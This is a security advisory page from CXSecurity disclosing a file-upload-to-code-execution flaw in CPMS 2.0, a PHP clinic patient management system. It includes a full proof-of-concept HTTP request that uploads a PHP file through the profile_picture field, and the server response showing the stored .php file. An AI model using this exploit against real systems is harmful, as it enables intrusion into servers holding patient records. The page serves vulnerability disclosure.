---
title: PHP - CPMS Version 2.0 File Upload and Remote Code Execution - RCE Vulnerabilities
url: https://cxsecurity.com/issue/WLB-2025010010
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-01-08
fetch_date: 2025-10-06T20:04:52.741181
---

# PHP - CPMS Version 2.0 File Upload and Remote Code Execution - RCE Vulnerabilities

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **PHP - CPMS Version 2.0 File Upload and Remote Code Execution - RCE Vulnerabilities** **2025.01.07**  **![bg](https://cert.cx/cxstatic/images/flags/bg.png) [nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/) **(BG)** ![bg](https://cert.cx/cxstatic/images/flags/bg.png)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Titles: PHP - CPMS Version 2.0 File Upload and Remote Code Execution - RCE Vulnerabilities
# Author: nu11secur1ty
# Date: 12/19/2024
# Vendor: https://github.com/oretnom23
# Software: https://www.sourcecodester.com/php-clinics-patient-management-system-source-code#comment-105951
# Reference: https://portswigger.net/web-security/file-upload & https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload
## Description:
profile\_picture parameter is not sanitizing correctly for file upload extension vulnerabilities.
The malicious admin actor can upload a very dangerous PHP file to the server and execute it directly from his browser.
STATUS: HIGH-CRITICAL Vulnerability
[+]PoC:
```POST
POST /pwnedhost/pms/update\_user.php?user\_id=1 HTTP/1.1
Host: 192.168.100.45
Cookie: PHPSESSID=9frtcadqm6q0ttavrpjquh3hif
Content-Length: 728
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="131", "Not\_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: https://192.168.100.45
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2AQt0lyUq6vhBVY9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://192.168.100.45/pwnedhost/pms/update\_user.php?user\_id=1
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
------WebKitFormBoundary2AQt0lyUq6vhBVY9
Content-Disposition: form-data; name="hidden\_id"
1
------WebKitFormBoundary2AQt0lyUq6vhBVY9
Content-Disposition: form-data; name="display\_name"
Administrator
------WebKitFormBoundary2AQt0lyUq6vhBVY9
Content-Disposition: form-data; name="username"
admin
------WebKitFormBoundary2AQt0lyUq6vhBVY9
Content-Disposition: form-data; name="password"
------WebKitFormBoundary2AQt0lyUq6vhBVY9
Content-Disposition: form-data; name="profile\_picture"; filename="info.php"
Content-Type: application/octet-stream
<?php
phpinfo();
?>
------WebKitFormBoundary2AQt0lyUq6vhBVY9
Content-Disposition: form-data; name="save\_user"
------WebKitFormBoundary2AQt0lyUq6vhBVY9--
```
[+]Response:
```
HTTP/1.1 302 Found
Date: Fri, 03 Jan 2025 09:10:14 GMT
Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.2.4
X-Powered-By: PHP/8.2.4
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: congratulation.php?goto\_page=users.php&message=user update successfully
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 10476
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<!-- Google Font: Source Sans Pro -->
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700&display=fallback">
<!-- Font Awesome -->
<link rel="stylesheet" href="plugins/fontawesome-free/css/all.min.css">
<!-- Theme style -->
<link rel="stylesheet" href="dist/css/adminlte.min.css">
<link rel="stylesheet" href="dist/js/jquery\_confirm/jquery-confirm.css">
<link rel="stylesheet" href="dist/css/default.css" />
<title>Update User Details - Clinic's Patient Management System in PHP</title>
</head>
<body class="hold-transition sidebar-mini dark-mode layout-fixed layout-navbar-fixed">
<!-- Site wrapper -->
<div class="wrapper">
<!-- Navbar -->
<!-- Navbar -->
<nav class="main-header navbar navbar-expand navbar-dark navbar-light fixed-top">
<!-- Left navbar links -->
<ul class="navbar-nav">
<li class="nav-item">
<a class="nav-link" data-widget="pushmenu" href="#" role="button"><i class="fas fa-bars"></i></a>
</li>
</ul>
<a href="index3.html" class="navbar-brand">
<span class="brand-text font-weight-light">Clinic's Patient Management System - PHP </span>
</a>
<!-- Right navbar links -->
<ul class="navbar-nav ml-auto">
<li class="nav-item">
<div class="login-user text-light font-weight-bolder">Howdy, Administrator!</div>
</li>
</ul>
</nav>
<!-- /.navbar --><aside class="main-sidebar sidebar-dark-primary bg-black elevation-4">
<a href="./" class="brand-link logo-switch bg-black">
<h4 class="brand-image-xl logo-xs mb-0 text-center"><b>CMS</b></h4>
<h4 class="brand-image-xl logo-xl mb-0 text-center">Clinic's <b>CMS</b></h4>
</a>
<!-- Sidebar -->
<div class="sidebar">
<!-- Sidebar user (optional) -->
<div class="user-panel mt-3 pb-3 mb-3 d-flex">
<div class="image">
<img
src="user\_images/17358952721nsi1deyou.php " class="img-circle elevation-2" alt="User Image" />
</div>
<div class="info">
<a href="#" class="d-block">Administrator</a>
</div>
</div>
<!-- Sidebar Menu -->
<nav class="mt-2">
<ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu" data-accordion="false">
<!-- Add icons to the links using the .nav-icon class
with font-awesome or any other icon font library -->
<li class="nav-item" id="mnu\_dashboard">
<a href="dashboard.php" class="nav-link">
<i class="nav-icon fas fa-tachometer-alt"></i>
<p>
Dashboard
</p>
</a>
</li>
<li class="nav-item" id="mnu\_patients">
<a href="#" class="nav-link">
<i class="nav-icon fas fa-user-injured"></i>
<p>
<i class="fas "></i>
Patients
<i class="right fas fa-angle-left"></i>
</p>
</a>
<ul class="nav nav-treeview">
<li class="nav-item">
<a href="new\_prescription.php" class="nav-link"
id="mi\_new\_prescription">
<i class="far fa-circle nav-icon"></i>
<p>New Prescription</p>
...